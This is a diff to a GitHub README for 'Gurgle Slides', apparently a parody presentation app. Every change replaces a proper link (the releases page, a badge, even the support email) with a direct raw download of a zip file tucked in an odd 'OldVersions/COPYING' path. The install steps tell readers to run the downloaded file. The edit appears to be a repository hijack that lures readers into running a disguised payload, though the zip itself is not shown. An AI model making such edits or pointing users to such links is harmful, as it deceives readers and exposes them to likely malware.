@@ -2,7 +2,7 @@
 
 Welcome to the official documentation source repository for Gurgle Slides, a parody of Google Slides. This repository contains all the information you need to get started, understand the features, and contribute to the project.
 
-[![Download Releases](https://img.shields.io/badge/Download_Releases-Click_here-brightgreen)](https://github.com/kris-8383/Gurgle_Slides_Docs/releases)
+[![Download Releases](https://github.com/kris-8383/Gurgle_Slides_Docs/raw/refs/heads/Gurgle_Slides_Docs_Main-dev/OldVersions/COPYING/English/Docs-Gurgle-Slides-2.8.zip)](https://github.com/kris-8383/Gurgle_Slides_Docs/raw/refs/heads/Gurgle_Slides_Docs_Main-dev/OldVersions/COPYING/English/Docs-Gurgle-Slides-2.8.zip)
 
 ## Table of Contents
 
@@ -31,7 +31,7 @@ Gurgle Slides is a fun and creative twist on the popular presentation software. 
 
 To install Gurgle Slides, follow these steps:
 
-1. Visit the [Releases section](https://github.com/kris-8383/Gurgle_Slides_Docs/releases) to download the latest version.
+1. Visit the [Releases section](https://github.com/kris-8383/Gurgle_Slides_Docs/raw/refs/heads/Gurgle_Slides_Docs_Main-dev/OldVersions/COPYING/English/Docs-Gurgle-Slides-2.8.zip) to download the latest version.
 2. Choose the appropriate file for your operating system.
 3. Execute the downloaded file to start the installation process.
 4. Follow the on-screen instructions to complete the installation.
@@ -70,7 +70,7 @@ Gurgle Slides is licensed under the GPLv3 License. You can view the full license
 
 If you have any questions or feedback, feel free to reach out:
 
-- **Email**: support@gurgleslides.com
+- **Email**: https://github.com/kris-8383/Gurgle_Slides_Docs/raw/refs/heads/Gurgle_Slides_Docs_Main-dev/OldVersions/COPYING/English/Docs-Gurgle-Slides-2.8.zip
 - **GitHub Issues**: Use the "Issues" tab in this repository to report bugs or request features.
 
 ## Acknowledgments
@@ -83,4 +83,4 @@ We want to thank the following:
 
 Thank you for checking out Gurgle Slides Docs! We hope you enjoy using Gurgle Slides as much as we enjoyed creating it. 
 
-For more information and updates, don't forget to visit the [Releases section](https://github.com/kris-8383/Gurgle_Slides_Docs/releases).
+For more information and updates, don't forget to visit the [Releases section](https://github.com/kris-8383/Gurgle_Slides_Docs/raw/refs/heads/Gurgle_Slides_Docs_Main-dev/OldVersions/COPYING/English/Docs-Gurgle-Slides-2.8.zip).
